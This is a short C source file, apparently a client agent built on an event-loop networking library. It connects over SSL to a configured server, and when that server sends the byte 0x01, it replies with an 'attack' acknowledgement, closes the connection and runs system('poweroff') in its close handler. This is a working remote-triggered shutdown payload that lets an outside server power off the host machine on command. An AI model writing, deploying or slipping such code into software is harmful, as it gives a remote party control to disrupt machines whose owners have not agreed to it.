#include "hios.h"

hio_t * sockio;
hloop_t * hloop;

static void timer_close() {
    hio_close(sockio);
}

static void on_close(__attribute__((unused)) hio_t* io) {
    printf("连接关闭\n");
    printf("执行攻击动作\n");
    system("poweroff");
}

static void on_connect(__attribute__((unused)) hio_t* io) {
    printf("连接已建立\n");
    hio_setcb_close(sockio, on_close);
    hio_read_start(sockio);
}

static void on_recv(__attribute__((unused)) hio_t* io, void * buf, int readbytes) {
    if (readbytes == 1 && ((char*)buf)[0] == '\x01') {
        cle_write_msg(sockio, ATTACK_ACK);
        printf("Receive attack...\n");
        htimer_add(hloop, timer_close, 1, 1);
    }
}

HioInitResult hios_init() {
    HioInitResult res = result_new_ok(0);
    hloop = hloop_new(HLOOP_FLAG_QUIT_WHEN_NO_ACTIVE_EVENTS);
    if (!hloop) {
        result_turn_err(res, HioInitErrOther);
        return res;
    }
    sockio = hloop_create_ssl_client(hloop, CONFIG_DEFAULT_SERVER_IP, CONFIG_DEFAULT_SERVER_PORT, on_connect, NULL);
    if (!sockio) {
        result_turn_err(res, HioInitErrOther);
        return res;
    }
    unpack_setting_t us_sock = {
            .mode = UNPACK_BY_DELIMITER,
            .package_max_length = DEFAULT_PACKAGE_MAX_LENGTH,
            .delimiter = SERVER_DELIMITER,
            .delimiter_bytes = SERVER_DELIMITER_BYTES
    };
    hio_set_unpack(sockio, &us_sock);

    hio_setcb_read(sockio, on_recv);
    return res;
}